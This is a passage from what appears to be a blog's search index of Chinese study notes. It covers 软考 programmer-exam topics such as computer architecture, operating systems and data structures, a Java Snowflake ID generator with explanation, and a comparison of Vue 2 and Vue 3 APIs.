（争议：也有将其归为控制器的）\n控制器的构成：\ni. 程序计数器 PC：存储下一条要执行指令的地址\nii. 指令寄存器 IR：存储正在执行的指令\niii. 指令译码器 ID：对指令中的操作码字段进行分析解释\niv. 时序部件：提供时序控制信号\n指令寻址和存储器 指令系统\n立即寻址方式：操作数直接在指令中，速度快，灵活性差\n直接寻址方式：指令中存放的是操作数的地址\n间接寻址方式：指令中存放了一个地址，这个地址对应的内容是操作数的地址\n寄存器寻址方式：寄存器存放操作数\n寄存器间接寻址方式：寄存器内存放的是操作数的地址\n回收站：外存\n剪切板：内存\n容量的换算\n位（b/bit）：存放一位二进制数\n字节（B/Byte）：8 个二进制位为一个字节\n1B=8b\n1KB=1024B\n1MB=1024KB\n1GB=1024MB\n1TB=1024GB\n1PB=1024TB\n1EB=1024PB\n1ZB=1024EB\n1YB=1024ZB\n内存编址\n内存编址：存储器由一块块的空间（存储单元）组成，为了方便寻找到每一块空间，我们需要对每一个空间进行标识，即用地址（唯一的编号）来标识内存每个单元内存容量=每个芯片容量*芯片个数\n每个芯片的容量=一个地址代表的容量*编址总数\n总线系统 总线分类：芯片内总线、元件级总线、系统总线（ ISA 总线、EISA 总线、PCI 总线等）和外总线（RS-232C、SCSI 总线、USB、IEEE-1394 等）\n系统总线的分类：地址总线、数据总线和控制总线\n数据总线：决定 CPU 和外界的数据传送速度。每条传输线一次只能传输 1 位二进制数据。“64 位的CPU”是指 CPU 的数据总线的宽度是 64 位。字长取决于数据总线的宽度。 地址总线：CPU 是通过地址总线来指定存储单元的，其决定了 CPU 所能访问的最大内存空间的大小。例如: 若计算机的地址总线的宽度为 32 位，则最多允许直接访问 4GB 的物理空间，所以最多支持 4G内存。 控制总线：对外部器件进行控制，其宽度决定了 CPU 对外部器件的控制能力。 设有一个64K×32位的存储器(每个存储单元为32位)，其存储单元的地址宽度为64K=2^16^，总共16位。这里32位可以说是每个存储单元为32位，也可以理解为数据总线宽度是32。\n系统总线的性能指标：\n带宽：单位时间上传送的数据量，即每秒钟传送的最大稳态数据传输率\n位宽：能同时传送的二进制数据的位数，或数据总线的位数，32 位、64 位等\nCPU 与外设数据交换方式\nCPU 与外设之间进行交换数据的方式：\n立即程序传送方式：I/O 接口总是准备接收来自主机的数据或向主机输入数据，无需查看接口的状态\n程序查询方式：CPU 通过查询执行程序查询外设的状态进行判断是否准备好\n中断方式：I/O 接口准备好后会发送中断信号通知 CPU，CPU 确认后保存正在执行程序现场转而执行 I/O 中断服务程序\n直接存储器存取 DMA 方式：数据的传送由 DMA 控制器进行控制，不需要 CPU 的干涉，只能进行简单的数据传送操作\n通道控制方式：CPU 按约定格式准备数据和命令，然后启动通道，通道执行相应的通道程序完成所要求的操作\n计算机的性能指标\n计算机系统的主要性能指标：\n响应时间：从用户输入完整的操作命令到系统开始显示应答信息为止的这段时间\n吞吐量：单位时间内系统完成的工作量\n周转时间：用户提交作业到执行后该作业返回给用户所需的时间\n时钟频率：即 CPU 主频，直接反映了机器的速度，通常主频越高其速度越快，主频=外频×倍频\n平均运算速度：指每秒钟所能执行的指令条数，用“百万条指令／秒”（MIPS）来描述\n多媒体基础知识 声音信号数字化过程：采样、量化和编码\n图像分辨率：一幅图像的像素密度，每英寸多少点（dpi）表示图像大小 ；200dpi扫描一幅2x2.5英寸的照片，则可以得到400x500像素点的图像。\n像素深度：存储每个像素所用的二进制数，度量图像的色彩分辨率，图像深度为b位，则该图像最多的颜色数或灰度级为2^b^种\n无损压缩：利用数据的统计冗余进行压缩，可以保证在数据压缩和还原过程中，图像信息没有损耗或失真。（RAR、ZIP、TIFF、BMP、GIF等）\n有损压缩：用于重构信号不一定非要与原始信号完全相同的场合，压缩比高。主要包括：DVD、VCD、MP3 、JPEG、 MPEG 、RMVB、 WMA 、WMV等）\n媒体的种类 1) 多媒体的概念及分类\n传播信息的载体，如语言、文字、图像、视频、音频等；\n存贮信息的载体，如 ROM、RAM、磁带、磁盘、光盘等。\n多媒体的分类：\n感觉媒体：直接用于人的感觉器官，使人产生直接感觉的媒体\n表示媒体：传输感觉媒体的中介媒体，用于数据交换的编码\n表现媒体：进行信息输入输出的媒体\n存储媒体：用于存储表示媒体的物理介质\n传输媒体：传输表示媒体的物理介质\n交换媒体包括存储媒体和传输媒体。\n多媒体编辑软件\n硬件系统：多媒体主机、多媒体输入设备、多媒体输出设备、多媒体存储设备、多媒体板卡、多媒体操作控制设备\n软件系统：多媒体操作系统、多媒体创作工具软件、多媒体素材编辑软件、多媒体应用软件\n多媒体素材编辑软件：\n文本工具：WPS、Notebook（记事本）、Writer（写字板）、word 和 OCR\n图形/图像工具：Photoshop、Illustrator、PhotoDeluxe、PageMaker、Coredraw、AutoCAD、Freehand、3ds Max、Screen Thief等\n动画工具：GIF Construction Set、Xara 3D\n视频工具：Media Studio Pro、Premiere\n音频工具：CoolEditPro、GoldWave、Cake Walk Pro Audio\n播放工具：Media Player、ACDSee\n音频 声音信号的数字化过程\n采样（采样频率，与采样周期成反比）\n量化（量化精度(量化分辨率):样本用二进制表示,位数多少反映精度）\n编码（按照一定格式进行数据编码及组织成文件）\n常见音频文件格式\n（.wav）：微软公司发布的音频文件格式, Windows 系统使用的标准音频文件格式。记录音乐的模拟信号的采样数值。质量高，数据量大。\n（.mod）：乐谱和乐曲使用的各种音色样本\n（.mp3）：最流行的音频文件格式\n（.ra）：网络上的音频格式，流媒体技术，强大压缩比和极小失真\n（.mid）：非波形采样点音乐格式，工业标准，文件非常小\n（.voc）：Create 公司发布的波形音频文件格式\n（.snd）：数字声音文件格式，支持压缩\n（.aif）：APPLE 计算机上的音频格式\n（.au）：Unix 系统中的数字文件格式\n图形和图像 图形/图像区别\n图形：矢量表示，用数学的方式来描述一幅图，放大、缩小、扭曲等变换后不会损失画面细节。（用于线框型图画、工程制图和美术字等）\n图像：像素点表示，用若干二进制位来指定像素的颜色、亮度和属性。放大后会失真。存储空间大，需进行压缩。\n图形图像主要性能指标\n显示分辨率：显示屏上能够显示的像素数目，1024x768 表示显示屏分为 768 行（垂直分辨率），每行（水平分辨率）显示 1024 像素。\n图像分辨率：一幅图像的像素密度，**每英寸多少点（dpi）**表示图像大小 ；200dpi 扫描一幅 2x2.5 英寸的照片，则可以得到400x500 像素点的图像。\n像素深度：存储每个像素所用的二进制数，度量图像的色彩分辨率，图像深度为 b 位，则该图像最多的颜色数或灰度级为 2^b^ 种\n常见图像文件格式\n（.bmp）：windows 标准位图文件格式\n（.gif）：用于网络传输，数据块为单位传输信息，采用无损压缩算法\n（.tif）：扫描仪和桌面出版系统中较为普及\n（.pcx）：PC 画笔的图像文件格式\n（.png）：作为 GIF 替代品\n（.jpg）：有损压缩，压缩比例高，适合于处理大量图像的场合\n（.wmf）：只在 windows 中使用，保存函数调用信息\njpeg：静态图像压缩标准\n动画和视频 常见视频文件格式\n（.gif）：用于网络传输\n（.avi）：微软公司发布的视频文件格式（AVI 文件）\n（.mov/.qt）：Apple 公司发布的视频文件格式，较小存储空间，开放性（Quick Time 文件）\n（.rm/.rmvb）：Real Networks 公司格式，影像实时传输与播放（RealVideo 文件）\n（.mpeg/.mpg/.dat/.mp4）：运动图像压缩标准，压缩效率高，质量好，兼容性好\n（.fli/.foc）:Autodesk 公司出品答得彩色动画文件格式（Flic 文件）\n多媒体相关计算 有损\u0026amp;无损压缩格式\n无损压缩：利用数据的统计冗余进行压缩，可以保证在数据压缩和还原过程中，图像信息没有损耗或失真。（RAR、ZIP、TIFF、BMP、GIF 等）\n有损压缩：用于重构信号不一定非要与原始信号完全相同的场合，压缩比高。主要包括：DVD、VCD、MP3 、JPEG、 MPEG 、RMVB、 WMA 、WMV 等）\n操作系统 信号量S：整型变量，并根据控制对象进行赋值。S≧0表示资源可用数，S\u0026lt;0表示排队进程数。\n互斥模型：多进程共享一台打印机。\n同步模型：单缓冲区生产者、消费者问题；多缓冲区生产者、消费者问题\n操作系统概述 操作系统的基本概念\n操作系统：组织和管理软件、硬件资源以及计算机系统中的工作流程，并控制程序的执行，向用户提供接口。\n特征：并发性、共享性、虚拟性和不确定性。\n功能：进程管理、存储管理、文件管理、作业管理和设备管理。\n类型：批处理、分时、实时、网络、分布式、微机和嵌入式。\n操作系统的五大功能\n进程管理：进程控制、进程同步、进程通信、进程调度\n文件管理：文件存储空间管理、目录管理、文件的读写管理、存取控制\n存储管理：存储分配与回收、存储保护、地址映射（变换）、主存扩充\n设备管理：对硬件设备管理，对输入输出设备的分配、启动、完成和回收\n作业管理：任务、界面管理，人机交互、图形界面、语音控制、虚拟现实\n操作系统的分类\n批处理操作系统：单道批和多道批操作系统\n分时操作系统： 一个计算机系统与多个终端设备连接，特点：多路性、独立性、交互性和及时性\n实时操作系统：实时控制系统和实时信息系统，交互能力要求不高，可靠性要求高\n网络操作系统：方便有效共享网络资源，提供服务软件和有关协议的集合，主要的网络操作系统有：Unix、Linux 和 Windows Server 系统\n分布式操作系统：任意两台计算机可以通过通信交换信息，是网络操作系统的更高级形式，具有透明性、可靠性和高性能等特性\n微机操作系统：Windows：Microsoft 开发的图形用户界面、多任务、多线程操作系统和 Linux：免费使用和自由传播的类 Unix 操作系统，多用户、多任务、多线程和多 CPU 的操作系统\n嵌入式操作系统：运行在智能芯片环境中，特点：微型化、可定制、实时性、可靠性、易移植性\n操作系统能方便用户之间的交流（x） 正确答案是网络\n进程管理 进程三态模型\n三态模型：哪三种状态和状态之间的转换\n信号量机制\n进程通信：各个进程交换信息的过程。\n分类：同步（直接制约）、互斥（申请临界资源间接制约）。\n信号量 S：整型变量，并根据控制对象进行赋值。S≧0 表示资源可用数，S\u0026lt;0 表示排队进程数。\nn个资源m个进程：S的范围是 n-m ~ n\nn个进程，每个进程需要m个资源\n一定不会产生死锁：资源数 \u0026gt;= n * (m - 1) + 1\n一定会产生死锁：资源数 \u0026lt;= m - 1\n分类：公用信号量（互斥）、私用信号量（同步）\nPV 机制、互斥和同步\n互斥模型：多进程共享一台打印机。\n同步模型：单缓冲区生产者、消费者问题；多缓冲区生产者、消费者问题\n在单缓冲区生产者消费模型中：s1、s2 是同步信号量，s1 的初值为 1，s2 的初值为 0。\n如果是多缓冲区生产者消费者问题，则：s1、s2 是同步信号量，s1 的初值为 n，s2 的初值为 0（n 表示缓冲区可以容纳的产品数量）。\n存储管理 存储管理：目的是解决多个用户使用主存的问题。\n分类：分区存储管理、分页存储管理、分段存储管理、段页式存储管理以及虚拟存储管理。\n分页存储管理：用户程序的地址空间被划分成若干固定大小的区域，称为“页”，相应地，内存空间分成若干个物理块，页和块的大小相等。可将用户程序的任一页放在内存的任一块中，实现了离散分配。\n分段存储管理：将用户程序地址空间分成若干个大小不等的段，每段可以定义一组相对完整的逻辑信息。存储分配时，以段为单位，段与段在内存中可以不相邻接，也实现了离散分配。作业的地址空间被划分为若干个段，每个段定义了一组逻辑信息。段的长度由相应的逻辑信息组的长度决定，因而各段长度不等。\n段页式存储管理：用分段方法来分配和管理虚拟存储器。程序的地址空间按逻辑单位分成基本独立的段，而每一段有自己的段名，再把每段分成固定大小的若干页。\n(2) 用分页方法来分配和管理实存。把整个主存分成与上述页大小相等的存储块，可装入作业的任何一页。程序对内存的调入或调出是按页进行的。\n相对地址/虚地址/逻辑地址：在目标程序中，程序指令和数据的位置按照字或字节单位根据它们的相对顺序来确定，称为相对地址，一般从O开始依次进行编号。\n相对地址空间通过地址再定位机构转换到绝对地址空间(物理地址空间)。\n虚拟存储管理\n虚拟存储器：利用外部辅存暂存主存待加载的数据，组成主存+辅存的虚拟存储结构。\n虚拟存储器的最大容量是由计算机系统的地址结构和外存空间决定的。\n采用虚拟存储器的目的是扩大用户的地址空间。\n局限性：时间局限性、空间局限性。\n实现方式：请求分页系统、请求分段系统、请求段页式系统。\n页面置换算法\n页面置换算法：最佳置换算法、先进先出置换算法、最近最少未使用置换算法、最近未用置换算法。\n先根据所采用的方式确定淘汰的页面，然后再淘汰掉这个页面，再把缺的页面置换进去即可。\n逻辑地址都是页号+页内地址\n设备管理 CPU 与外设之间进行交换数据的方式：\n直接程序控制：\n1）立即程序传送方式：I/O 接口总是准备接收来自主机的数据或向主机输入数据，无需查看接口的状态；\n2）程序查询方式：CPU 通过查询执行程序查询外设的状态进行判断是否准备好，I/O 设备不主动反馈信息；\n中断方式：I/O 接口准备好后会发送中断信号通知 CPU，CPU 确认后保存正在执行程序现场转而执行 I/O 中断服务程序；\n直接存储器存取 DMA 方式：数据的传送由 DMA 控制器进行控制，不需要 CPU 的干涉，只能进行简单的数据传送操作；\n通道控制方式：CPU 按约定格式准备数据和命令，然后启动通道，通道执行相应的通道程序完成所要求的操作。\n磁盘调度\n磁盘调度：采用适当的调度算法，使各进程对磁盘的平均访问时间最小。硬/磁盘的主要技术指标：道密度、位密度、存储容量、平均存取时间、寻道时间、等待时间、数据传输率。\n数据读取时间：通常由磁道搜索、扇区搜索、数据传输三个部分组成。\n驱动调度：先来先服务、最短寻道时间优先、扫描算法、单向扫描调度算法。\n磁盘调度算法\n先来先服务算法：该算法实际上不考虑访问者要求访问的物理位置，而只是考虑访问者提出访问请求的先后次序。有可能随时改变移动臂的方向。\n最短寻找时间优先调度算法：从等待的访问者中挑选寻找时间最短的那个请求执行，而不管访问者的先后次序。这也有可能随时改变移动臂的方向。\n电梯调度算法：从移动臂当前位置沿移动方向选择最近的那个柱面的访问者来执行，若该方向上无请求访问时，就改变臂的移动方向再选择。\n单向扫描调度算法：不考虑访问者等待的先后次序，总是从 0 号柱面开始向里道扫描，按照各自所要访问的柱面位置的次序去选择访问者。在移动臂到达最后一个柱面后，立即快速返回到 0 号柱面，返回时不为任何的访问者提供服务，在返回到 0 号柱面后，再次进行扫描。\n文件管理 文件结构\n文件：具有符号名的、在逻辑上具有完整意义的一组相关信息项的集合。\n目录结构：一级目录结构、二级目录结构、三级目录结构\n文件路径\n绝对路径：从根目录开始的路径（如：C:\\username\\desktop\\document\\ABC.docx）\n相对路径：从用户当前工作目录下开始的路径 （如：document\\ABC.docx）\n文件命名要求\n文件夹命名规则：\n1）最大长度为 255 个字符\n2）允许使用英文字母，数字。￥ @ \u0026amp; +（ ）、下划线、空格、汉字，不允许使用？ \\ * \u0026lt; \u0026gt; ： / | ”\n3）在操作系统中搜索时可以用 * 匹配 0 个或多个字符，用 ? 匹配任何一个字符\n文件管理\n建立文件夹结构：建立适合自己的文件夹结构，注意控制文件夹结构的级数和每个文件夹中文件的个数（级数不要超过 5 级，每个文件夹的个数控制在 100 以内）\n文件和文件夹命名：规范的对文件夹和文件命名方便查看和检索\n数据备份 backup：对关键数据定期及时的备份，以免数据被毁造成重大损失\n文件类型\n文件类型和文件后缀名的对应关系\n系统的安全\n系统的安全：\n系统级：主要任务是不允许未经核准的用户进入系统，主要措施有：注册和登录\n用户级：对所有用户分类和对指定用户分配访问权，设置不同的存储权限分为超级用户、系统操作员和一般用户\n目录级：保护系统中的各种目录而设计的\n文件级：通过系统管理员或文件主对文件属性的设置来控制用户对文件的访问用户对文件的访问，包含：用户访问权、目录访问权限及文件属性权限\n用户权限管理\nwindows 中系统对用户的默认权限情况：\nAdministrators：管理员组，用户对计算机/域有不受限制的完全访问权。\nPower Users：高级用户组可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。\nUsers：普通用户组，这个组的用户无法进行有意或无意的改动。\nEveryone：所有的用户，这个计算机上的所有用户都属于这个组。\nGuests：来宾组，来宾组跟普通组 Users 的成员有同等访问权，但来宾账户的限制更多。\n作业管理 正在执行的作业是进程。\n作业调度：先来先服务、短作业优先、响应比高优先、优先级调度、均衡调度。\n用户界面\n用户界面（ User interface ）：计算机中实现用户与计算通信的软件、硬件部分总称，也称之为用户接口或人机界面。\n用户界面设计原则：简易性、用户的语言、记忆负担最小化、一致性、利用用户的熟悉程度、从用户的观点考虑（最关键的判断点）、排列分组、安全性、人性化\n程序设计语言 程序设计语言及其构成 表达式 中缀转后缀：运算顺序保持不变\n后缀表达式运算过程：通过==栈==：先取出来放后面，后取出来放前面\n传值和传址调用 语言处理程序 编译程序 有限自动机和正规式 数据结构和算法知识 栈是只能在一端进行插入和删除操作的线性表，其中允许插入和删除的一端叫做栈顶，另一端叫做栈底。栈是一种后进先出（LIFO）的数据结构，先入栈的元素要比后入栈的元素后出栈。故将一串数据全部入栈后再全部出栈，数据的次序将前后颠倒。栈主要应用于函数调用或中断调用过程中。\n队列是一种先进先出（FIFO）的数据结构，先入队列的元素要先于后入队列的元素出队列。故一串数据无论以何种操作次序通过队列，其次序都不会发生变化。\n如果对一棵有n个结点的完全二叉树的结点按层序编号则对任一结点i（1≤i≤n），有： ①如果i=1，则结点i无父结点，是二叉树的根；如果i\u0026gt;1，则父结点是$\\lfloor i/2 \\rfloor$； ② 如果2i\u0026gt;n，则结点i为叶子结点，无左子结点；否则，其左子结点是结点2i； ③ 如果2i+1\u0026gt;n，则结点i无右子叶点，否则，其右子结点是结点2i+1。 向下取整\n顺序表和链表 线性结构和非线性结构的区别\n数组 字符串 矩阵 栈和队列 树 树的基本性质 如果对一棵有n个结点的完全二叉树的结点按层序编号则对任一结点i（1≤i≤n），有： ①如果i=1，则结点i无父结点，是二叉树的根；如果i\u0026gt;1，则父结点是$\\lfloor i/2 \\rfloor$； ② 如果2i\u0026gt;n，则结点i为叶子结点，无左子结点；否则，其左子结点是结点2i； ③ 如果2i+1\u0026gt;n，则结点i无右子叶点，否则，其右子结点是结点2i+1。 向下取整\n树的遍历 特殊二叉树 找最小两个树，先写在图上，然后把两数相加的结果放到待选择列表，并删除这两个数（第一次：删除10、20，添加30）\n图 算法特性和复杂度 查找 排序 软件工程知识点 软件工程概述 软件需求分析 软件设计 软件测试 软件运行与维护 程序员职业素养 面向对象基础知识 面向对象基本概念 UML 设计模式 数据库知识点 数据库基本概念 数据流图 概念模型 关系模型 关系运算 SQL语言 数据库控制 网络基础知识点 网络概述 OSI和TCPIP IP地址与子网划分 浏览器 URL和电子邮件 网络安全 知识产权 其他 文件类型 Excel常考函数 ","permalink":"https://chance7bin.github.io/posts/note/%E8%BD%AF%E8%80%83-%E7%A8%8B%E5%BA%8F%E5%91%98/","summary":"学习攻略 真题 真题，建议从 10 年开始做，10 - 15 年的真题练习用，16 - 18 年真题自己卡时间模拟考 程序员考试重点汇总 计算机系统基础知识 进制之间的转化","title":"软考 程序员"},{"content":" 参考链接：\n快速了解雪花算法详解及spring boot集成\nSpringBoot快速开发（六）【雪花算法（snowflake）自增ID】\n1.介绍 SnowFlow算法是Twitter推出的分布式id生成算法，主要核心思想就是利用64bit的long类型的数字作为全局的id。在分布式系统中经常应用到，并且，在id中加入了时间戳的概念，基本上保持不重复，并且持续一种向上增加的方式。\n在这64bit中，其中第一个bit是不用的，然后用其中的41个bit作为毫秒数，用10bit作为工作机器id,12bit作为序列号.具体如下图所示：\n第一个部分：0,这个是个符号位，因为在二进制中第一个bit如果是1的话，那么都是负数，但是我们生成的这些id都是正数，所以第一个bit基本上都是0 第二个部分：41个bit,代表的是一个时间戳，41bit可以表示的数字多达$2^{41} $-1,也可以表示2^{41}-1 个毫秒值，基本上差不多是69年。 第三个部分：5个bit 表示的是机房id。 第四个部分：5个bit 表示的是机器id。 第五个部分：12个bit 表示的是机房id，表示的序号，就是某个机房某台机器上这一毫秒内同时生成的 id 的序号，0000 00000000，如果是同一毫秒，那么这个雪花值就会递增 简单来说，你的某个服务假设要生成一个全局唯一 id，那么就可以发送一个请求给部署了 SnowFlake 算法的系统，由这个 SnowFlake 算法系统来生成唯一 id。\n这个算法可以保证说，一个机房的一台机器上，在同一毫秒内，生成了一个唯一的 id。可能一个毫秒内会生成多个 id，但是有最后 12 个 bit 的序号来区分开来。\n下面我们就来简单看下这个算法的代码实现部分。\n总之就是用一个64bit的数字中各个bit位置来设置不同的标志位\n2.代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 /** * id自增器（雪花算法） * * @author bin * @date 2022/10/11 */ public class SnowFlake { private final static long twepoch = 12888349746579L; // 机器标识位数 private final static long workerIdBits = 5L; // 数据中心标识位数 private final static long datacenterIdBits = 5L; // 毫秒内自增位数 private final static long sequenceBits = 12L; // 机器ID偏左移12位 private final static long workerIdShift = sequenceBits; // 数据中心ID左移17位 private final static long datacenterIdShift = sequenceBits + workerIdBits; // 时间毫秒左移22位 private final static long timestampLeftShift = sequenceBits + workerIdBits + datacenterIdBits; //sequence掩码，确保sequnce不会超出上限 private final static long sequenceMask = -1L ^ (-1L \u0026lt;\u0026lt; sequenceBits); //上次时间戳 private static long lastTimestamp = -1L; //序列 private long sequence = 0L; //服务器ID private long workerId = 1L; private static long workerMask = -1L ^ (-1L \u0026lt;\u0026lt; workerIdBits); //进程编码 private long processId = 1L; private static long processMask = -1L ^ (-1L \u0026lt;\u0026lt; datacenterIdBits); private static SnowFlake snowFlake = null; static{ snowFlake = new SnowFlake(); } public static synchronized long nextId(){ return snowFlake.getNextId(); } private SnowFlake() { //获取机器编码 this.workerId=this.getMachineNum(); //获取进程编码 RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean(); this.processId=Long.valueOf(runtimeMXBean.getName().split(\u0026#34;@\u0026#34;)[0]).longValue(); //避免编码超出最大值 this.workerId=workerId \u0026amp; workerMask; this.processId=processId \u0026amp; processMask; } public synchronized long getNextId() { //获取时间戳 long timestamp = timeGen(); //如果时间戳小于上次时间戳则报错 if (timestamp \u0026lt; lastTimestamp) { try { throw new Exception(\u0026#34;Clock moved backwards. Refusing to generate id for \u0026#34; + (lastTimestamp - timestamp) + \u0026#34; milliseconds\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } //如果时间戳与上次时间戳相同 if (lastTimestamp == timestamp) { // 当前毫秒内，则+1，与sequenceMask确保sequence不会超出上限 sequence = (sequence + 1) \u0026amp; sequenceMask; if (sequence == 0) { // 当前毫秒内计数满了，则等待下一秒 timestamp = tilNextMillis(lastTimestamp); } } else { sequence = 0; } lastTimestamp = timestamp; // ID偏移组合生成最终的ID，并返回ID long nextId = ((timestamp - twepoch) \u0026lt;\u0026lt; timestampLeftShift) | (processId \u0026lt;\u0026lt; datacenterIdShift) | (workerId \u0026lt;\u0026lt; workerIdShift) | sequence; return nextId; } /** * 再次获取时间戳直到获取的时间戳与现有的不同 * @param lastTimestamp * @return 下一个时间戳 */ private long tilNextMillis(final long lastTimestamp) { long timestamp = this.timeGen(); while (timestamp \u0026lt;= lastTimestamp) { timestamp = this.timeGen(); } return timestamp; } private long timeGen() { return System.currentTimeMillis(); } /** * 获取机器编码 * @return */ private long getMachineNum(){ long machinePiece; StringBuilder sb = new StringBuilder(); Enumeration\u0026lt;NetworkInterface\u0026gt; e = null; try { e = NetworkInterface.getNetworkInterfaces(); } catch (SocketException e1) { e1.printStackTrace(); } while (e.hasMoreElements()) { NetworkInterface ni = e.nextElement(); sb.append(ni.toString()); } machinePiece = sb.toString().hashCode(); return machinePiece; } } 使用\n1 Long id = SnowFlake.nextId(); 3.算法优缺点 优点：\n（1）高性能高可用：生成时不依赖于数据库，完全在内存中生成。\n（2）容量大：每秒中能生成数百万的自增ID。\n（3）ID自增：存入数据库中，索引效率高。\n缺点：\n（1）依赖与系统时间的一致性，如果系统时间被回调，或者改变，可能会造成id冲突或者重复(时钟重播造成的id重复问题)\n","permalink":"https://chance7bin.github.io/posts/note/%E9%9B%AA%E8%8A%B1%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E5%8F%8Aspringboot%E9%9B%86%E6%88%90/","summary":"参考链接： 快速了解雪花算法详解及spring boot集成 SpringBoot快速开发（六）【雪花算法（snowflake）自增ID】 1.介绍","title":"雪花算法详解及springboot集成"},{"content":" 参考链接：\n一个 Java 猿眼中 Vue3 和 Vue2 的差异\n（建议收藏）Vue3 对比 Vue2.x 差异性、注意点、整体梳理，与React hook比又如何？（面试热点）\nVue2升级到Vue3到底是不是一个正确的选择？(尤雨溪亲自回复解读)\n选项式API和组合式API 选项式 API (Options API) 使用选项式 API，我们可以用包含多个选项的对象来描述组件的逻辑，例如 data、methods 和 mounted。选项所定义的属性都会暴露在函数内部的 this 上，它会指向当前的组件实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;script\u0026gt; export default { // data() 返回的属性将会成为响应式的状态 // 并且暴露在 `this` 上 data() { return { count: 0 } }, // methods 是一些用来更改状态与触发更新的函数 // 它们可以在模板中作为事件监听器绑定 methods: { increment() { this.count++ } }, // 生命周期钩子会在组件生命周期的各个不同阶段被调用 // 例如这个函数就会在组件挂载完成后被调用 mounted() { console.log(`The initial count is ${this.count}.`) } } \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;button @click=\u0026#34;increment\u0026#34;\u0026gt;Count is: {{ count }}\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; 组合式 API (Composition API) 通过组合式 API，我们可以使用导入的 API 函数来描述组件逻辑。在单文件组件中，组合式 API 通常会与 \u0026lt;script setup\u0026gt; 搭配使用。这个 setup attribute 是一个标识，告诉 Vue 需要在编译时进行一些处理，让我们可以更简洁地使用组合式 API。比如，\u0026lt;script setup\u0026gt; 中的导入和顶层变量/函数都能够在模板中直接使用。\n下面是使用了组合式 API 与 \u0026lt;script setup\u0026gt; 改造后和上面的模板完全一样的组件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;script setup\u0026gt; import { ref, onMounted } from \u0026#39;vue\u0026#39; // 响应式状态 const count = ref(0) // 用来修改状态、触发更新的函数 function increment() { count.value++ } // 生命周期钩子 onMounted(() =\u0026gt; { console.log(`The initial count is ${count.value}.`) }) \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;button @click=\u0026#34;increment\u0026#34;\u0026gt;Count is: {{ count }}\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; 区别 参考链接\nvue3学习（2）选项式API和组合式API的区别\n响应式 setup() reactive https://blog.csdn.net/weixin_47886687/article/details/112918795\ntoRefs ref 在setup函数中，可以使用ref函数，用于创建一个响应式数据，当数据发生改变时，Vue会自动更新UI\n参考链接：\nVue3.0 reactive()、ref()、unref()、isref()、toRefs()、computed()\nreactive vs ref reactive参数一般接受对象或数组，是深层次的响应式。ref参数一般接收简单数据类型，若ref接收对象为参数，本质上会转变为reactive方法 在JS中访问ref的值需要手动添加.value，访问reactive不需要 响应式的底层原理都是Proxy 计算属性 计算属性缓存 vs 方法 你可能注意到我们在表达式中像这样调用一个函数也会获得和计算属性相同的结果：\n1 \u0026lt;p\u0026gt;{{ calculateBooksMessage() }}\u0026lt;/p\u0026gt; 1 2 3 4 5 6 // 组件中 methods: { calculateBooksMessage() { return this.author.books.length \u0026gt; 0 ? \u0026#39;Yes\u0026#39; : \u0026#39;No\u0026#39; } } 若我们将同样的函数定义为一个方法而不是计算属性，两种方式在结果上确实是完全相同的，然而，不同之处在于计算属性值会基于其响应式依赖被缓存。一个计算属性仅会在其响应式依赖更新时才重新计算。这意味着只要 author.books 不改变，无论多少次访问 publishedBooksMessage 都会立即返回先前的计算结果，而不用重复执行 getter 函数。\n这也解释了为什么下面的计算属性永远不会更新，因为 Date.now() 并不是一个响应式依赖：\n1 2 3 4 5 computed: { now() { return Date.now() } } 相比之下，方法调用总是会在重渲染发生时再次执行函数。\n为什么需要缓存呢？想象一下我们有一个非常耗性能的计算属性 list，需要循环一个巨大的数组并做许多计算逻辑，并且可能也有其他计算属性依赖于 list。没有缓存的话，我们会重复执行非常多次 list 的计算函数，然而这实际上没有必要！如果你确定不需要缓存，那么也可以使用方法调用。\n可写计算属性 计算属性默认仅能通过计算函数得出结果。当你尝试修改一个计算属性时，你会收到一个运行时警告。只在某些特殊场景中你可能才需要用到“可写”的属性，你可以通过同时提供 getter 和 setter 来创建：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 export default { data() { return { firstName: \u0026#39;John\u0026#39;, lastName: \u0026#39;Doe\u0026#39; } }, computed: { fullName: { // getter get() { return this.firstName + \u0026#39; \u0026#39; + this.lastName }, // setter set(newValue) { // 注意：我们这里使用的是解构赋值语法 [this.firstName, this.lastName] = newValue.split(\u0026#39; \u0026#39;) } } } } 现在当你再运行 this.fullName = 'John Doe' 时，setter 会被调用而 this.firstName 和 this.lastName 会随之更新。\n最佳实践 计算函数不应有副作用 计算属性的计算函数应只做计算而没有任何其他的副作用，这一点非常重要，请务必牢记。举例来说，不要在计算函数中做异步请求或者更改 DOM！一个计算属性的声明中描述的是如何根据其他值派生一个值。因此计算函数的职责应该仅为计算和返回该值。在之后的指引中我们会讨论如何使用监听器根据其他响应式状态的变更来创建副作用。\n避免直接修改计算属性值 从计算属性返回的值是派生状态。可以把它看作是一个“临时快照”，每当源状态发生变化时，就会创建一个新的快照。更改快照是没有意义的，因此计算属性的返回值应该被视为只读的，并且永远不应该被更改——应该更新它所依赖的源状态以触发新的计算。\n条件渲染 v-if 和 v-for 警告\n同时使用 v-if 和 v-for 是不推荐的，因为这样二者的优先级不明显。查看风格指南获得更多信息。\n当 v-if 和 v-for 同时存在于一个元素上的时候，v-if 会首先被执行。\n当它们同时存在于一个节点上时，v-if 比 v-for 的优先级更高。这意味着 v-if 的条件将无法访问到 v-for 作用域内定义的变量别名：\n1 2 3 4 5 